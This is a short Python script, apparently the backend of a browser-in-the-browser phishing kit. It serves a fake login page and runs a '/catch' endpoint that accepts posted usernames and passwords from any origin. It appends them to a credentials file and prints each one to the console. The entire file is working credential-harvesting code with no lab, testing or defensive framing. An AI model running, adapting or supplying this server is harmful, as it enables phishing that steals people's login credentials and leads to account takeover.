import os,json
from http.server import HTTPServer,BaseHTTPRequestHandler
from datetime import datetime
PORT    = int(os.environ.get("CATCHER_PORT","8082"))
LOG_DIR = os.environ.get("LOG_DIR","/tmp/op/logs")
CAUGHT  = f"{LOG_DIR}/credentials.txt"
BITB    = os.path.join(os.path.dirname(os.path.abspath(__file__)),"index.html")
os.makedirs(LOG_DIR,exist_ok=True)
def ts(): return datetime.now().strftime("%H:%M:%S")
class H(BaseHTTPRequestHandler):
    def log_message(self,*a): pass
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","POST,GET,OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type")
    def do_OPTIONS(self): self.send_response(204);self._cors();self.end_headers()
    def do_GET(self):
        try: data=open(BITB,"rb").read()
        except: data=b"<h1>BitB</h1>"
        self.send_response(200);self.send_header("Content-Type","text/html");self.send_header("Content-Length",len(data));self.end_headers();self.wfile.write(data)
    def do_POST(self):
        n=int(self.headers.get("Content-Length",0));body=self.rfile.read(n).decode(errors="replace")
        if self.path=="/catch":
            try:
                d=json.loads(body)
                line=f"[{ts()}]  user={d.get('user','?')!r}  pass={d.get('pass','?')!r}  src=bitb\n"
                open(CAUGHT,"a").write(line);print(f"[CREDS] {line.strip()}",flush=True)
            except: pass
        self.send_response(200);self._cors();self.send_header("Content-Length","0");self.end_headers()
if __name__=="__main__":
    print(f"[*] BitB catcher :{PORT}",flush=True)
    HTTPServer(("0.0.0.0",PORT),H).serve_forever()
